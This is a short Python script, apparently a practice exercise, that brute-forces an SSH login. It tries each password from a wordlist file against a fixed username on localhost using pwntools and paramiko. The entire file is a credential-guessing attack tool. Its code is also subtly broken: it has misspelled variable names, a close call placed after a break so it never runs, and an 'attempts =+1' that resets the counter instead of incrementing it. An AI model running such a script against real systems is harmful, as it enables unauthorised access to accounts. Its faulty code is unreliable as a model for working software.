from pwn import *
import paramiko

host = "127.0.0.1"
username = "akshay12shinde"
attempts = 0

with open("Trail.txt", "r") as list:
	for password in list:
		password = password.strip("\n")
		try:
			print("Attempt {} with passowrd {}".format(attempts, password))
			response = ssh(host = host, user = username, password = password, timeout =5)
			if response.connected():
				print("Password is {}".format(password))
				repnse.close
				break
				reponse.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("Invalid Password")

		attempts =+1

	   
			
